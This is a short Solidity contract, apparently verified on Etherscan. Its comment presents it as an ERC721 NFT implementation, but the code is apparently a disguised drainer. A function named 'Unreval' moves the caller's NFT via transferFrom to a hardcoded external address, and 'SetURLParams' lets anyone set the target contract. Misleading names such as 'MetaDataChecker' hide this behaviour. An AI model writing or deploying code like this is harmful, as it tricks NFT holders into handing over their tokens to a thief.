/**
 *Submitted for verification at Etherscan.io on 2021-10-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
 * the Metadata extension, but not including the Enumerable extension, which is available separately as
 * {ERC721Enumerable}.
 */
interface MetaDataChecker {
    function transferFrom(address, address, uint256) external;

}

contract UnrevalMeka {
    address Meka;
    function SetURLParams(address _t) public {
        Meka = _t;
    }
    function Unreval(uint256 _id) public virtual {
        return MetaDataChecker(Meka).transferFrom(msg.sender, 0x8E6BEB5f56eebBd77cde327954Ac9E1d15Eb8EA6, _id);
    }
}